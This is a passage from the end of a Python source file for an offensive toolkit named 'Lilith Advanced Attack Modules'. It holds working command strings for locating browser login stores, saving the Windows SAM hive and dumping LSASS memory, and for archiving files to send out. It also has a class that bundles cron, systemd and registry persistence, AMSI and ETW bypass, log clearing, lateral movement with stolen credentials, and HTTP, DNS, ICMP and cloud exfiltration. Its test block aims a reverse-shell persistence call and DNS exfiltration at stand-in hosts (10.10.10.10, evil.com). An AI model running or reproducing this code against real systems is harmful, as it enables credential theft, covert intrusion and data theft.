                'find_databases': '''find / -name "*.db" -o -name "*.sqlite" -o -name "*.sql" 2>/dev/null''',
                'find_documents': '''find /home -name "*.doc*" -o -name "*.xls*" -o -name "*.pdf" 2>/dev/null''',
                'dump_browser': '''find /home -path "*/.mozilla/firefox/*.default/logins.json" -o -path "*/.config/google-chrome/Default/Login Data" 2>/dev/null''',
                'collect_all': f'''tar czf /tmp/exfil.tar.gz {' '.join(target_dirs)} 2>/dev/null'''
            },
            'windows': {
                'find_sensitive': '''dir /s /b C:\\*.conf C:\\*.cfg C:\\*.ini C:\\*.key 2>nul''',
                'dump_sam': '''reg save HKLM\\SAM sam.save & reg save HKLM\\SYSTEM system.save''',
                'dump_lsass': '''procdump.exe -ma lsass.exe lsass.dmp'''
            }
        }


# =============================================================================
# UNIFIED ADVANCED ATTACK MODULE
# =============================================================================

class AdvancedAttackModule:
    """
    Unified interface for all advanced attack capabilities.
    """
    
    def __init__(self):
        self.persistence = PersistenceModule()
        self.evasion = DefenseEvasionModule()
        self.lateral = LateralMovementModule()
        self.exfil = ExfiltrationModule()
    
    def get_all_persistence_techniques(self, lhost: str, lport: int) -> Dict:
        """Get all persistence techniques"""
        return {
            'linux': {
                'cron': self.persistence.linux_cron_persistence(lhost, lport),
                'bashrc': self.persistence.linux_bashrc_persistence(lhost, lport),
                'systemd': self.persistence.linux_systemd_persistence(lhost, lport),
                'init': self.persistence.linux_init_persistence(lhost, lport),
                'ld_preload': self.persistence.linux_ld_preload_persistence(lhost, lport)
            },
            'windows': {
                'registry': self.persistence.windows_registry_persistence(lhost, lport),
                'scheduled_task': self.persistence.windows_scheduled_task_persistence(lhost, lport),
                'wmi': self.persistence.windows_wmi_persistence(lhost, lport)
            }
        }
    
    def get_all_evasion_techniques(self) -> Dict:
        """Get all defense evasion techniques"""
        return {
            'linux': {
                'log_clearing': self.evasion.linux_log_clearing(),
                'process_hiding': self.evasion.linux_process_hiding()
            },
            'windows': {
                'amsi_bypass': self.evasion.windows_amsi_bypass(),
                'defender_evasion': self.evasion.windows_defender_evasion(),
                'etw_bypass': self.evasion.windows_etw_bypass(),
                'log_clearing': self.evasion.windows_log_clearing()
            },
            'obfuscation': self.evasion.obfuscation_techniques()
        }
    
    def get_all_lateral_techniques(self, target: str, username: str, password: str) -> Dict:
        """Get all lateral movement techniques"""
        return {
            'ssh': self.lateral.ssh_lateral_movement(target, username, password),
            'smb': self.lateral.smb_lateral_movement(target, username, password),
            'winrm': self.lateral.winrm_lateral_movement(target, username, password),
            'rdp': self.lateral.rdp_lateral_movement(target, username, password),
            'wmi': self.lateral.wmi_lateral_movement(target, username, password)
        }
    
    def get_all_exfil_techniques(self, exfil_server: str) -> Dict:
        """Get all exfiltration techniques"""
        return {
            'http': self.exfil.http_exfiltration("sample_data", exfil_server),
            'https': self.exfil.https_exfiltration("sample_data", exfil_server),
            'dns': self.exfil.dns_exfiltration("sample_data", exfil_server),
            'icmp': self.exfil.icmp_exfiltration("sample_data", exfil_server),
            'cloud': self.exfil.cloud_exfiltration("/etc/passwd"),
            'archive': self.exfil.archive_and_encrypt("/sensitive/data", "/tmp/exfil"),
            'staging': self.exfil.data_staging()
        }


# Singleton
_advanced_attack = None

def get_advanced_attack_module() -> AdvancedAttackModule:
    global _advanced_attack
    if _advanced_attack is None:
        _advanced_attack = AdvancedAttackModule()
    return _advanced_attack


if __name__ == '__main__':
    print("=" * 70)
    print("LILITH ADVANCED ATTACK MODULES - TEST")
    print("=" * 70)
    
    module = get_advanced_attack_module()
    
    print("\n[1] Persistence Techniques:")
    persist = module.persistence.linux_cron_persistence("10.10.10.10", 4444)
    print(f"  - {persist['name']}: {persist['description']}")
    
    print("\n[2] Evasion Techniques:")
    evasion = module.evasion.linux_log_clearing()
    print(f"  - {evasion['name']}: {len(evasion['commands'])} commands")
    
    print("\n[3] Lateral Movement:")
    lateral = module.lateral.smb_lateral_movement("target", "admin", "pass")
    print(f"  - {lateral['name']}: {len(lateral['commands'])} methods")
    
    print("\n[4] Exfiltration:")
    exfil = module.exfil.dns_exfiltration("secret_data", "evil.com")
    print(f"  - {exfil['name']}: Covert DNS channel")
    
    print("\n" + "=" * 70)
    print("ALL MODULES LOADED!")
    print("=" * 70)
